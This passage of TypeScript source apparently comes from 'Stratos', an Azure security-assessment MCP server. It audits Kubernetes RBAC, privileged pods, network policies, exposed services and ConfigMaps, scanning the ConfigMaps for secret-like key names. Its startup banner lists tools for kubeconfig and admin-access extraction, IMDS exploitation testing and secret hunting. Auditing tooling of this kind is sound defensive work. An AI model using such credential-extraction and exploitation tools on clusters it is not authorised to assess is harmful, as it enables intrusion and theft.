                  role: (crb as any).roleRef?.name,
                  subjects: subjects
                });
              }
            }
            
            output += `| Metric | Count |\n|--------|-------|\n`;
            output += `| Cluster Role Bindings | ${crbItems.length} |\n`;
            output += `| Role Bindings | ${rbItems.length} |\n`;
            output += `| Dangerous Cluster Bindings | ${dangerousBindings.length} |\n\n`;
            
            if (dangerousBindings.length > 0) {
              output += `### 🚨 High-Privilege Cluster Role Bindings\n\n`;
              output += `| Binding Name | Role | Subjects |\n|--------------|------|----------|\n`;
              for (const b of dangerousBindings.slice(0, 15)) {
                output += `| ${b.name} | ${b.role} | ${b.subjects.slice(0, 2).join(', ')}${b.subjects.length > 2 ? '...' : ''} |\n`;
              }
              output += '\n';
              
              const clusterAdminCount = dangerousBindings.filter(b => b.role === 'cluster-admin').length;
              if (clusterAdminCount > 5) {
                findings.push({
                  severity: 'HIGH',
                  category: 'RBAC',
                  finding: `${clusterAdminCount} cluster-admin bindings found`,
                  details: 'Excessive cluster-admin bindings - review and reduce'
                });
                highCount++;
              }
            }
          } catch (e: any) {
            output += `❌ Failed to analyze RBAC: ${e.message}\n\n`;
          }

          // ========== 5. PRIVILEGED PODS ==========
          output += `## 🐳 Pod Security Analysis\n\n`;
          try {
            const podsCmd = namespace
              ? `get pods -n ${namespace} -o json`
              : `get pods --all-namespaces -o json`;
            const podsJson = await runKubectl(podsCmd);
            const podItems = JSON.parse(podsJson).items || [];
            
            const privilegedPods: Array<{ns: string; name: string; container: string; issues: string[]}> = [];
            const hostNetworkPods: Array<{ns: string; name: string}> = [];
            const hostPathPods: Array<{ns: string; name: string; paths: string[]}> = [];
            
            for (const pod of podItems) {
              const podName = (pod as any).metadata?.name || 'unknown';
              const podNs = (pod as any).metadata?.namespace || 'unknown';
              
              if ((pod as any).spec?.hostNetwork) {
                hostNetworkPods.push({ ns: podNs, name: podName });
              }
              
              const hostPaths = ((pod as any).spec?.volumes || [])
                .filter((v: any) => v.hostPath)
                .map((v: any) => v.hostPath?.path || 'unknown');
              if (hostPaths.length > 0) {
                hostPathPods.push({ ns: podNs, name: podName, paths: hostPaths });
              }
              
              for (const container of ((pod as any).spec?.containers || [])) {
                const sc = container.securityContext;
                const issues: string[] = [];
                
                if (sc?.privileged) issues.push('privileged');
                if (sc?.allowPrivilegeEscalation !== false) issues.push('allowPrivilegeEscalation');
                if (sc?.runAsUser === 0) issues.push('runAsRoot');
                if (sc?.capabilities?.add?.includes('SYS_ADMIN')) issues.push('CAP_SYS_ADMIN');
                
                if (issues.length > 0 && issues.includes('privileged')) {
                  privilegedPods.push({
                    ns: podNs,
                    name: podName,
                    container: container.name,
                    issues: issues
                  });
                }
              }
            }
            
            output += `| Metric | Count |\n|--------|-------|\n`;
            output += `| Total Pods | ${podItems.length} |\n`;
            output += `| Privileged Containers | ${privilegedPods.length} |\n`;
            output += `| Host Network Pods | ${hostNetworkPods.length} |\n`;
            output += `| Host Path Mounts | ${hostPathPods.length} |\n\n`;
            
            if (privilegedPods.length > 0) {
              output += `### 🚨 Privileged Containers\n\n`;
              output += `| Namespace | Pod | Container | Issues |\n|-----------|-----|-----------|--------|\n`;
              for (const p of privilegedPods.slice(0, 10)) {
                output += `| ${p.ns} | ${p.name} | ${p.container} | ${p.issues.join(', ')} |\n`;
              }
              output += '\n';
              
              findings.push({
                severity: 'CRITICAL',
                category: 'Pod Security',
                finding: `${privilegedPods.length} pods running with privileged: true`,
                details: 'Privileged containers can escape to host'
              });
              criticalCount++;
            }
            
            if (hostNetworkPods.length > 0) {
              output += `### ⚠️ Pods with Host Network\n\n`;
              for (const p of hostNetworkPods.slice(0, 5)) {
                output += `- \`${p.ns}/${p.name}\`\n`;
              }
              output += '\n';
              
              findings.push({
                severity: 'HIGH',
                category: 'Pod Security',
                finding: `${hostNetworkPods.length} pods using hostNetwork`,
                details: 'Can access host network interfaces'
              });
              highCount++;
            }
            
            if (hostPathPods.length > 0) {
              output += `### ⚠️ Pods with Host Path Mounts\n\n`;
              output += `| Namespace | Pod | Host Paths |\n|-----------|-----|------------|\n`;
              for (const p of hostPathPods.slice(0, 10)) {
                output += `| ${p.ns} | ${p.name} | ${p.paths.join(', ')} |\n`;
              }
              output += '\n';
              
              const rootMounts = hostPathPods.filter(p => p.paths.some(path => path === '/' || path === '/etc'));
              if (rootMounts.length > 0) {
                findings.push({
                  severity: 'CRITICAL',
                  category: 'Pod Security',
                  finding: `${rootMounts.length} pods mounting sensitive host paths`,
                  details: 'Host filesystem access can lead to escape'
                });
                criticalCount++;
              }
            }
          } catch (e: any) {
            output += `❌ Failed to analyze pods: ${e.message}\n\n`;
          }

          // ========== 6. NETWORK POLICIES ==========
          output += `## 🌐 Network Policies\n\n`;
          try {
            const npCmd = namespace 
              ? `get networkpolicies -n ${namespace} -o json`
              : `get networkpolicies --all-namespaces -o json`;
            const npJson = await runKubectl(npCmd);
            const npItems = JSON.parse(npJson).items || [];
            
            const npCount = npItems.length;
            
            output += `| Metric | Count |\n|--------|-------|\n`;
            output += `| Network Policies | ${npCount} |\n\n`;
            
            if (npCount === 0) {
              findings.push({
                severity: 'CRITICAL',
                category: 'Network',
                finding: 'No network policies defined in cluster',
                details: 'All pods can communicate freely'
              });
              criticalCount++;
            }
            
            if (npCount > 0) {
              output += `### 📋 Network Policies\n\n`;
              output += `| Namespace | Policy Name |\n|-----------|-------------|\n`;
              for (const np of npItems.slice(0, 10)) {
                output += `| ${(np as any).metadata?.namespace} | ${(np as any).metadata?.name} |\n`;
              }
              output += '\n';
            }
          } catch (e: any) {
            output += `❌ Failed to analyze network policies: ${e.message}\n\n`;
          }

          // ========== 7. EXPOSED SERVICES ==========
          output += `## 🌍 Exposed Services\n\n`;
          try {
            const svcCmd = namespace 
              ? `get services -n ${namespace} -o json`
              : `get services --all-namespaces -o json`;
            const svcJson = await runKubectl(svcCmd);
            const svcItems = JSON.parse(svcJson).items || [];
            
            const loadBalancers: Array<{ns: string; name: string; ip: string; ports: string[]}> = [];
            const nodePortServices: Array<{ns: string; name: string; ports: string[]}> = [];
            
            for (const svc of svcItems) {
              const svcName = (svc as any).metadata?.name || 'unknown';
              const svcNs = (svc as any).metadata?.namespace || 'unknown';
              
              if ((svc as any).spec?.type === 'LoadBalancer') {
                const ips = ((svc as any).status?.loadBalancer?.ingress || []).map((i: any) => i.ip || i.hostname || 'pending');
                const ports = ((svc as any).spec?.ports || []).map((p: any) => `${p.port}/${p.protocol}`);
                loadBalancers.push({ ns: svcNs, name: svcName, ip: ips.join(', '), ports });
              } else if ((svc as any).spec?.type === 'NodePort') {
                const ports = ((svc as any).spec?.ports || []).map((p: any) => `${p.nodePort}→${p.port}`);
                nodePortServices.push({ ns: svcNs, name: svcName, ports });
              }
            }
            
            output += `| Metric | Count |\n|--------|-------|\n`;
            output += `| Total Services | ${svcItems.length} |\n`;
            output += `| LoadBalancer Services | ${loadBalancers.length} |\n`;
            output += `| NodePort Services | ${nodePortServices.length} |\n\n`;
            
            if (loadBalancers.length > 0) {
              output += `### 🔴 LoadBalancer Services (Internet Exposed)\n\n`;
              output += `| Namespace | Service | External IP | Ports |\n|-----------|---------|-------------|-------|\n`;
              for (const lb of loadBalancers) {
                output += `| ${lb.ns} | ${lb.name} | ${lb.ip || 'pending'} | ${lb.ports.join(', ')} |\n`;
              }
              output += '\n';
              
              findings.push({
                severity: 'HIGH',
                category: 'Services',
                finding: `${loadBalancers.length} LoadBalancer services exposed`,
                details: 'Review if all require public access'
              });
              highCount++;
            }
          } catch (e: any) {
            output += `❌ Failed to analyze services: ${e.message}\n\n`;
          }

          // ========== 8. CONFIGMAPS ==========
          output += `## 📄 ConfigMaps Analysis\n\n`;
          try {
            const cmCmd = namespace 
              ? `get configmaps -n ${namespace} -o json`
              : `get configmaps --all-namespaces -o json`;
            const cmJson = await runKubectl(cmCmd);
            const cmItems = JSON.parse(cmJson).items || [];
            
            const sensitiveConfigMaps: Array<{ns: string; name: string; keys: string[]}> = [];
            const secretPatterns = ['password', 'secret', 'key', 'token', 'credential', 'apikey'];
            
            for (const cm of cmItems) {
              const data = (cm as any).data || {};
              const suspiciousKeys: string[] = [];
              
              for (const [key, value] of Object.entries(data)) {
                if (secretPatterns.some(p => key.toLowerCase().includes(p))) {
                  suspiciousKeys.push(key);
                }
              }
              
              if (suspiciousKeys.length > 0) {
                sensitiveConfigMaps.push({
                  ns: (cm as any).metadata?.namespace || 'unknown',
                  name: (cm as any).metadata?.name || 'unknown',
                  keys: suspiciousKeys
                });
              }
            }
            
            output += `| Metric | Count |\n|--------|-------|\n`;
            output += `| Total ConfigMaps | ${cmItems.length} |\n`;
            output += `| ConfigMaps with Potential Secrets | ${sensitiveConfigMaps.length} |\n\n`;
            
            if (sensitiveConfigMaps.length > 0) {
              output += `### ⚠️ ConfigMaps with Potential Sensitive Data\n\n`;
              output += `| Namespace | ConfigMap | Suspicious Keys |\n|-----------|-----------|------------------|\n`;
              for (const cm of sensitiveConfigMaps.slice(0, 10)) {
                output += `| ${cm.ns} | ${cm.name} | ${cm.keys.slice(0, 3).join(', ')} |\n`;
              }
              output += '\n';
              
              findings.push({
                severity: 'MEDIUM',
                category: 'ConfigMaps',
                finding: `${sensitiveConfigMaps.length} ConfigMaps may contain secrets`,
                details: 'Move secrets to Secrets or Key Vault'
              });
              mediumCount++;
            }
          } catch (e: any) {
            output += `❌ Failed to analyze ConfigMaps: ${e.message}\n\n`;
          }

          // ========== SUMMARY ==========
          output += `---\n\n`;
          output += `## 📊 Live Scan Summary\n\n`;
          output += `| Severity | Count |\n|----------|-------|\n`;
          output += `| 🔴 CRITICAL | ${criticalCount} |\n`;
          output += `| 🟠 HIGH | ${highCount} |\n`;
          output += `| 🟡 MEDIUM | ${mediumCount} |\n`;
          output += `| 🟢 LOW | ${lowCount} |\n`;
          output += `| **TOTAL** | **${findings.length}** |\n\n`;

          if (findings.length > 0) {
            output += `### 🚨 All Findings\n\n`;
            output += `| # | Severity | Category | Finding | Details |\n|---|----------|----------|---------|----------|\n`;
            let i = 1;
            for (const f of findings) {
              const icon = f.severity === 'CRITICAL' ? '🔴' : f.severity === 'HIGH' ? '🟠' : f.severity === 'MEDIUM' ? '🟡' : '🟢';
              output += `| ${i++} | ${icon} ${f.severity} | ${f.category} | ${f.finding} | ${f.details} |\n`;
            }
            output += '\n';
          }

          const riskScore = (criticalCount * 40) + (highCount * 20) + (mediumCount * 5) + (lowCount * 1);
          let riskLevel = 'LOW';
          let riskEmoji = '🟢';
          if (riskScore >= 100) { riskLevel = 'CRITICAL'; riskEmoji = '🔴'; }
          else if (riskScore >= 50) { riskLevel = 'HIGH'; riskEmoji = '🟠'; }
          else if (riskScore >= 20) { riskLevel = 'MEDIUM'; riskEmoji = '🟡'; }
          
          output += `### Risk Assessment\n\n`;
          output += `**Risk Score:** ${riskScore}\n`;
          output += `**Risk Level:** ${riskEmoji} **${riskLevel}**\n`;
          output += `**Scan Mode:** kubectl CLI (30s timeout per command)\n\n`;

          output += `---\n\n`;
          output += `*Generated by Stratos MCP v1.9.6 - Live Kubernetes Security Scan*\n`;

          // Cleanup temp kubeconfig
          try {
            await fs.unlink(tempKubeconfig);
          } catch (cleanupErr) {
            // Ignore cleanup errors
          }

          return {
            content: [{ type: 'text', text: output }],
          };
        } catch (error: any) {
          return {
            content: [{ type: 'text', text: `Error running live AKS scan: ${error.message}` }],
            isError: true,
          };
        }
      }

      default:
        throw new Error(`Unknown tool: ${request.params.name}`);
    }
  } catch (error) {
    return {
      content: [
        {
          type: "text",
          text: `Error: ${error instanceof Error ? error.message : String(error)}`,
        },
      ],
      isError: true,
    };
  }
});

// Start the server
async function main() {
  const transport = new StdioServerTransport();
  await server.connect(transport);
  
  // Display welcome message
  console.error("\n" + "=".repeat(70));
  console.error("Stratos - Azure Security Assessment MCP Server");
  console.error("=".repeat(70));
  console.error("\n[OK] Server Status: Running");
  console.error("Transport: stdio");
  console.error("Version: 1.9.1");
  console.error("\nAvailable Tools (36):");
  console.error("\n  Multi-Location Scanning (NEW!):");
  console.error("   1. list_active_locations     - Discover active Azure regions");
  console.error("   2. scan_all_locations        - Scan resources across regions");
  console.error("\n  Core Enumeration:");
  console.error("   3. enumerate_subscriptions   - List Azure subscriptions");
  console.error("   4. enumerate_resource_groups - List resource groups (+ location filter)");
  console.error("   5. enumerate_resources       - List resources (+ location filter)");
  console.error("   6. get_resource_details      - Detailed resource config");
  console.error("\n  Network & Storage Security:");
  console.error("   7. analyze_storage_security  - Storage misconfiguration scanner");
  console.error("   8. analyze_nsg_rules         - Network exposure analyzer");
  console.error("   9. enumerate_public_ips      - Internet attack surface mapping");
  console.error("   10. enumerate_rbac_assignments - Access control auditing");
  console.error("\n  Database, Secrets, Compute:");
  console.error("   11. scan_sql_databases       - SQL security & TDE encryption");
  console.error("   12. analyze_key_vault_security - Key Vault configuration audit");
  console.error("   13. analyze_cosmos_db_security - Cosmos DB exposure checker");
  console.error("   14. analyze_vm_security      - VM disk encryption & agents");
  console.error("\n  AKS/Kubernetes Security (8 tools):");
  console.error("   15. scan_aks_full            - 🚀 FULL AKS SCAN (all 7 checks in one!)");
  console.error("   16. scan_aks_clusters        - AKS RBAC & network policies");
  console.error("   17. get_aks_credentials      - Extract kubeconfig & admin access");
  console.error("   18. enumerate_aks_identities - Map managed identities & RBAC");
  console.error("   19. scan_aks_node_security   - Node encryption & SSH analysis");
  console.error("   20. test_aks_imds_access     - IMDS exploitation testing");
  console.error("   21. scan_aks_service_accounts - Service account security");
  console.error("   22. hunt_aks_secrets         - Secret hunting guide");
  console.error("\n  DevOps & Reporting:");
  console.error("   23. scan_azure_devops        - Azure DevOps security scanner");
  console.error("   24. generate_security_report - PDF/HTML/CSV report export");
  console.error("\n[TIP] Quick Start:");
  console.error("   scan_aks_full subscriptionId='SUB' resourceGroup='RG' clusterName='CLUSTER'");
  console.error("   list_active_locations subscriptionId='SUB' scanMode='all'");
  console.error("\nAuthentication: Using Azure CLI credentials (az login)");
  console.error("=".repeat(70) + "\n");
}

main().catch((error) => {
  console.error("Fatal error in main():", error);
  process.exit(1);
});
